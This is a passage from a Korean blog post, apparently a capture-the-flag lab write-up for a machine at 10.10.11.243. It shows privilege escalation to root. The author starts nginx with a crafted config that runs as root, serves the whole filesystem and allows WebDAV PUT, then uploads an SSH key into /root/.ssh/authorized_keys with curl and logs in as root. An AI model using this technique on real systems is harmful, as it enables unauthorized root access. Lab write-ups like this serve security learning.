&lt;p&gt;&lt;a href=&quot;https://github.com/advisories/GHSA-w7p3-hmmp-qmx6&quot;&gt;Zimbra 디스클로져&lt;/a&gt;와 같은 방식으로 진행해보자. &lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;nginx&lt;/code&gt; 구성파일중 &lt;code class=&quot;language-text&quot;&gt;user-www-data&lt;/code&gt; 라고 작성되어 있는 부분을 &lt;code class=&quot;language-text&quot;&gt;root&lt;/code&gt; 로 바꿔주면 된다.
&lt;img src=&quot;https://velog.velcdn.com/images/h3llanut3lla/post/0c303d62-bd24-4a0e-8f86-00da12b5c4c8/image.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;아래와 같은 &lt;code class=&quot;language-text&quot;&gt;pwn.conf&lt;/code&gt; 라는 새 구성파일을 만들어준다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;sh&quot;&gt;&lt;pre class=&quot;language-sh&quot;&gt;&lt;code class=&quot;language-sh&quot;&gt;user root&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;# 워커 프로세스가 root 권한으로 실행&lt;/span&gt;
worker_processes &lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
pid /tmp/nginx.pid&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
events &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
		worker_connections &lt;span class=&quot;token number&quot;&gt;768&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
http &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
	server &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
		listen &lt;span class=&quot;token number&quot;&gt;1337&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
		root /&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
		autoindex on&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
		dav_methods PUT&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://velog.velcdn.com/images/h3llanut3lla/post/b7b868a1-578b-4de5-bfd0-b0cdab7c91dd/image.png&quot;&gt;
새로 만든 &lt;code class=&quot;language-text&quot;&gt;pwn.conf&lt;/code&gt; 가 잘 실행되었는지 확인하기 위해, 열린 포트를 보면 아래와 같이 포트 1337이 열린것을 볼 수 있다.
&lt;img src=&quot;https://velog.velcdn.com/images/h3llanut3lla/post/906e1180-82e5-4365-b8c5-7a05a351eb05/image.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;그럼 이제 &lt;code class=&quot;language-text&quot;&gt;/root/.ssh/authorized_keys&lt;/code&gt; 에 대한 공개 SSH키를 만들어보자.
&lt;img src=&quot;https://velog.velcdn.com/images/h3llanut3lla/post/7700d7cb-b3f7-4e86-a8b8-5df4cc597c84/image.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;칼리에서 &lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;sh&quot;&gt;&lt;pre class=&quot;language-sh&quot;&gt;&lt;code class=&quot;language-sh&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# SSH키 생성&lt;/span&gt;
ssh-keygen &lt;span class=&quot;token parameter variable&quot;&gt;-f&lt;/span&gt; broker

&lt;span class=&quot;token comment&quot;&gt;# 생성된 키를 타겟에 전달&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;curl&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;10.10&lt;/span&gt;.11.243:1337/root/.ssh/authorized_keys --upload-file broker.pub&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;그리고 키를 이용해 SSH로 접속하면&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;sh&quot;&gt;&lt;pre class=&quot;language-sh&quot;&gt;&lt;code class=&quot;language-sh&quot;&gt;&lt;span class=&quot;token function&quot;&gt;ssh&lt;/span&gt; &lt;span class=&quot;token parameter variable&quot;&gt;-i&lt;/span&gt; broker root@10.10.11.243&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://velog.velcdn.com/images/h3llanut3lla/post/f5039481-5ee3-4380-9be3-b14aed525772/image.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;root&lt;/code&gt;로 권한이 상승된것을 확인할 수 있다. &lt;/p&gt;</content:encoded></item></channel></rss>